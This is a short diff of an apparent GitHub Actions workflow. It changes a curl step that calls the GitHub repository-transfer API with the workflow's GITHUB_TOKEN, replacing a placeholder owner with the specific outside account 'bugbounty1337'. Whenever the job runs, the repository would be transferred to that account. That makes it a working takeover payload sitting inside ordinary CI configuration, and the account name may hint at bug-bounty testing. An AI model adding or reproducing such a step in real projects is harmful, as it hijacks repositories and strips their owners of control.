@@ -39,5 +39,5 @@ jobs:
           curl -X POST \
             -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
             -H "Accept: application/vnd.github.v3+json" \
-            -d '{"new_owner":"seu-usuario"}' \
+            -d '{"new_owner":"bugbounty1337"}' \
             https://api.github.com/repos/${{ github.repository }}/transfer
